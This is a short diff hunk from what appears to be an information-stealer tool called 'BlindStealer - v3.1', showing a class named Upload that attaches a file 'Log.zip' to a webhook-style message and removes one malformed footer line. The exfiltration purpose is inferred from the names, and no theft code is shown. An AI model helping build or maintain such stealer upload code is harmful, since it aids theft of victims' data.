@@ -66,7 +66,6 @@ class Upload:
                 color=0x24262A,
             ),
             file=File("Log.zip"),
-                footer=(text=pizda, icon_url=None)
                 username="BlindStealer - v3.1",
                 avatar_url="https://i.imgur.com/LNVOaxg.png",
         ) 
